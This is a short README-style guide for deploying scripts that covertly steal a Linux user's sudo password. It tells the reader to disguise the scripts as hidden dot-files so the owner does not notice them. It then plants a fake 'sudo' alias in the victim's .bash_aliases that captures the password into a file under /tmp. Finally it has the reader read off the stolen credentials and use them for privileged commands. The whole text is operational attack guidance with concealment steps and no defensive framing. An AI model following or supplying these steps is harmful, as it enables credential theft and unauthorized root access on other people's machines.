### BEFORE USING THESE SCRIPTS ###
*-> change their names to a random file name in order to the machine's owner does not realize it's a malicious script, never forget to precede the file name
with a "." (no quotes, obsviously), it will automatically hide the file, and not show them with a simple `ls` command by the machine's owner

1-> run the `.to.sh` script on the target machine, it will add a "sudo" alias inside the .bash_aliases file of the target machine
   1.1-> then, when the to.sh is succesfull executed, whenever the target write "sudo <randomcommand>" on his machine's terminal \
         it will not execute the real sudo, instead, it will execute the get_parameters.sh file, in which will capture the sudo password
   2-> then, you just have to ```cat /tmp/content_extra_file ``` to be able to see the -> username : sudo_password
   
   after all:
   FINAL -> whenever you want to run a sudo command on the target machine, remember to run as follows:
            username@distro:~$ echo '<sudo_password>' | sudo -S <command>
